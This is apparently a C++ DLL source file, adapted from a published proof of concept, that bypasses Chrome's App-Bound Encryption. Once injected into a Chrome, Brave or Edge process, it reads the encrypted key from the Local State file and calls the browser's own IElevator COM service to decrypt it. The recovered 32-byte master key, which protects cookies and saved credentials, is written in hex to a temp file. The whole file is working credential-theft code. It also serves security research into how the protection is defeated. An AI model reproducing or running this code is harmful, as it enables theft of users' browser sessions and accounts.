/*
 * Chrome App-Bound Encryption Service:
 * https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
 * https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view
 * Based on the code of @snovvcrash
 * https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
 */

 #include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>
#include <algorithm>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

namespace Logging {
    std::string GetLogFilePath() {
        char tempPath[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tempPath)) {
            return std::string(tempPath) + "chrome_decrypt.log";
        }
        return "";
    }

    void Log(const std::string& message, bool overwrite = false) {
        std::string logFile = GetLogFilePath();
        if (!logFile.empty()) {
            std::ofstream file(logFile, overwrite ? std::ios::trunc : std::ios::app);
            if (file) {
                file << message << std::endl;
                file.close();
            }
        }
    }
}

enum class ProtectionLevel {
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR* crx_path, const WCHAR* browser_appid, const WCHAR* browser_version,
        const WCHAR* session_id, DWORD caller_proc_id, ULONG_PTR* proc_handle) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        ProtectionLevel protection_level, const BSTR plaintext,
        BSTR* ciphertext, DWORD* last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, BSTR* plaintext, DWORD* last_error) = 0;
};

namespace ChromeAppBound {
    constexpr size_t KeySize = 32;
    const uint8_t KeyPrefix[] = { 'A', 'P', 'P', 'B' };

    struct BrowserConfig {
        CLSID clsid;
        IID iid;
        std::string executablePath;
        std::string localStatePath;
        std::string name;
    };

    BrowserConfig GetBrowserConfig(const std::string& browserType) {
        if (browserType == "chrome") {
            return {
                {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
                {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "\\Google\\Chrome\\User Data\\Local State",
                "Chrome"
            };
        }
        else if (browserType == "brave") {
            return {
                {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
                {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
                "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                "Brave"
            };
        }
        else if (browserType == "edge") {
            return {
                {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
                {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\\Microsoft\\Edge\\User Data\\Local State",
                "Edge"
            };
        }
        throw std::invalid_argument("Unsupported browser type");
    }

    std::string BytesToHexString(const BYTE* byteArray, size_t size) {
        std::ostringstream oss;
        for (size_t i = 0; i < size; ++i) {
            oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byteArray[i]);
        }
        return oss.str();
    }

    std::string GetAppDataPath() {
        char appDataPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath) != S_OK) {
            Logging::Log("[-] Could not retrieve AppData path.");
            return "";
        }
        return std::string(appDataPath);
    }

    std::vector<uint8_t> Base64Decode(const std::string& encoded_string) {
        const std::string base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";

        auto is_base64 = [](unsigned char c) {
            return (isalnum(c) || (c == '+') || (c == '/'));
        };

        int in_len = encoded_string.size();
        int i = 0, j = 0, in_ = 0;
        uint8_t char_array_4[4], char_array_3[3];
        std::vector<uint8_t> ret;

        while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
            char_array_4[i++] = encoded_string[in_]; in_++;
            if (i == 4) {
                for (i = 0; i <4; i++) {
                    char_array_4[i] = static_cast<uint8_t>(base64_chars.find(char_array_4[i]));
                }

                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                for (i = 0; i < 3; i++) {
                    ret.push_back(char_array_3[i]);
                }
                i = 0;
            }
        }

        if (i) {
            for (j = i; j <4; j++) {
                char_array_4[j] = 0;
            }

            for (j = 0; j <4; j++) {
                char_array_4[j] = static_cast<uint8_t>(base64_chars.find(char_array_4[j]));
            }

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (j = 0; j < i - 1; j++) {
                ret.push_back(char_array_3[j]);
            }
        }

        Logging::Log("[+] Finished decoding.");
        return ret;
    }

    std::vector<uint8_t> RetrieveEncryptedKeyFromLocalState(const std::string& localStatePath) {
        Logging::Log("[+] Retrieving AppData path.");

        std::string appDataPath = GetAppDataPath();
        if (appDataPath.empty()) {
            Logging::Log("[-] AppData path is empty.");
            return {};
        }

        std::string fullPath = appDataPath + localStatePath;
        Logging::Log("[+] Local State path: " + fullPath);

        std::ifstream file(fullPath);
        if (!file.is_open()) {
            Logging::Log("[-] Could not open the Local State file at path: " + fullPath);
            return {};
        }

        std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        const std::string searchKey = "\"app_bound_encrypted_key\":\"";
        size_t keyStartPos = fileContent.find(searchKey);
        if (keyStartPos == std::string::npos) {
            Logging::Log("[-] 'app_bound_encrypted_key' not found in Local State file.");
            return {};
        }

        keyStartPos += searchKey.length();
        size_t keyEndPos = fileContent.find("\"", keyStartPos);
        if (keyEndPos == std::string::npos) {
            Logging::Log("[-] Malformed 'app_bound_encrypted_key' in Local State file.");
            return {};
        }

        std::string base64_encrypted_key = fileContent.substr(keyStartPos, keyEndPos - keyStartPos);
        Logging::Log("[+] Base64 key extracted.");

        std::vector<uint8_t> encrypted_key_with_header = Base64Decode(base64_encrypted_key);

        if (encrypted_key_with_header.size() < sizeof(KeyPrefix) || 
            !std::equal(std::begin(KeyPrefix), std::end(KeyPrefix), encrypted_key_with_header.begin())) {
            Logging::Log("[-] Invalid key header.");
            return {};
        }

        Logging::Log("[+] Key header is valid.");
        return std::vector<uint8_t>(encrypted_key_with_header.begin() + sizeof(KeyPrefix), encrypted_key_with_header.end());
    }

    std::string GetTempFilePath() {
        char tempPath[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tempPath)) {
            return std::string(tempPath) + "chrome_appbound_key.txt";
        }
        return "";
    }

    void SaveKeyToFile(const std::string& key) {
        std::string tempFile = GetTempFilePath();
        if (!tempFile.empty()) {
            std::ofstream file(tempFile, std::ios::trunc);
            if (file) {
                file << key;
                file.close();
            }
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        Logging::Log("", true);

        std::string browserType;
        char exePath[MAX_PATH];
        if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
            std::string exeName = exePath;
            if (exeName.find("brave.exe") != std::string::npos) {
                browserType = "brave";
            }
            else if (exeName.find("msedge.exe") != std::string::npos) {
                browserType = "edge";
            }
            else {
                browserType = "chrome";
            }
        }

        try {
            ChromeAppBound::BrowserConfig config = ChromeAppBound::GetBrowserConfig(browserType);

            HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
            if (FAILED(hr)) {
                Logging::Log("[-] Failed to initialize COM. Error: 0x" + std::to_string(hr));
                return TRUE;
            }

            Logging::Log("[+] COM library initialized.");

            Microsoft::WRL::ComPtr<IElevator> elevator;
            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, (void**)&elevator);

            if (FAILED(hr)) {
                std::ostringstream errorMsg;
                errorMsg << "[-] Failed to create IElevator instance. Error: 0x" << std::hex << hr;
                
                if (hr == REGDB_E_CLASSNOTREG) {
                    errorMsg << " (Class not registered)";
                }
                else if (hr == E_NOINTERFACE) {
                    errorMsg << " (No such interface supported)";
                }
                else if (hr == E_ACCESSDENIED) {
                    errorMsg << " (Access denied)";
                }
                
                Logging::Log(errorMsg.str());
                CoUninitialize();
                return TRUE;
            }

            Logging::Log("[+] IElevator instance created successfully.");

            hr = CoSetProxyBlanket(
                elevator.Get(),
                RPC_C_AUTHN_DEFAULT,
                RPC_C_AUTHZ_DEFAULT,
                COLE_DEFAULT_PRINCIPAL,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                nullptr,
                EOAC_DYNAMIC_CLOAKING);

            if (FAILED(hr)) {
                Logging::Log("[-] Failed to set proxy blanket. Error: 0x" + std::to_string(hr));
                CoUninitialize();
                return TRUE;
            }

            Logging::Log("[+] Proxy blanket set successfully.");

            std::vector<uint8_t> encrypted_key = ChromeAppBound::RetrieveEncryptedKeyFromLocalState(config.localStatePath);
            if (encrypted_key.empty()) {
                Logging::Log("[-] No valid encrypted key retrieved.");
                CoUninitialize();
                return TRUE;
            }

            std::string hexKey = ChromeAppBound::BytesToHexString(encrypted_key.data(), std::min<size_t>(20, encrypted_key.size()));
            Logging::Log("[+] Encrypted key retrieved: " + hexKey + "...");

            BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char*>(encrypted_key.data()), encrypted_key.size());
            if (!ciphertext_data) {
                Logging::Log("[-] Failed to allocate BSTR for encrypted key.");
                CoUninitialize();
                return TRUE;
            }

            Logging::Log("[+] BSTR allocated for encrypted key.");

            BSTR plaintext_data = nullptr;
            DWORD last_error = ERROR_GEN_FAILURE;
            hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);

            if (SUCCEEDED(hr)) {
                if (plaintext_data && SysStringByteLen(plaintext_data) == ChromeAppBound::KeySize) {
                    Logging::Log("[+] Decryption successful.");

                    BYTE decrypted_key[ChromeAppBound::KeySize];
                    memcpy(decrypted_key, reinterpret_cast<void*>(plaintext_data), ChromeAppBound::KeySize);
                    SysFreeString(plaintext_data);

                    std::string finalKey = ChromeAppBound::BytesToHexString(decrypted_key, ChromeAppBound::KeySize);
                    ChromeAppBound::SaveKeyToFile(finalKey);
                }
                else {
                    Logging::Log("[-] Decryption returned invalid data format.");
                }
            }
            else {
                std::ostringstream errorMsg;
                errorMsg << "[-] Decryption failed. HRESULT: 0x" << std::hex << hr << ", Last error: " << last_error;                
                Logging::Log(errorMsg.str());
            }

            SysFreeString(ciphertext_data);
            CoUninitialize();
        }
        catch (const std::exception& e) {
            Logging::Log("[-] Exception: " + std::string(e.what()));
        }
    }
    return TRUE;
}